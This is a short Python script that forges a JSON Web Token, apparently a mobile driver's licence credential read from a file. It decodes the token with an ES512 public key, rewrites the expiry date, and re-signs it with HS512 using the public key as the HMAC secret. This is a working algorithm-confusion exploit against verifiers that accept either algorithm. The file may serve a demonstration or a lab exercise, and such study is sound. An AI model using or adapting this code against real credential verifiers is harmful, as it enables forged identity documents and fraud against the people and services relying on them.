#!/usr/bin/env python3

import jwt

public_key = u'''-----BEGIN PUBLIC KEY-----
MIGbMBAGByqGSM49AgEGBSuBBAAjA4GGAAQBGOtycGkAMpTEDsjFykEywLecIdCX
1QIShxmJB0qJj9K2yFNwJj/eRR6yzIZcHJPZWzQU6Mad62y1MsJ8uOgdZ2sBmkS0
HJtT4FZq/EQbtkHeahsDnSLbFpPfoN/t8hmKrVmDzDRGe3PNl7OQVuzoY2TVSxVK
IKmpZ9Pw9/5HOzSmOxs=-----END PUBLIC KEY-----
'''

token = open("mdl.txt", "rt").read()

credential = jwt.decode(token, key=public_key, algorithms=["ES512"])
credential["expiry_date"] = "2025-08-27T12:00:00.00"
fake_token = jwt.encode(credential, algorithm="HS512", key=public_key)
print(fake_token)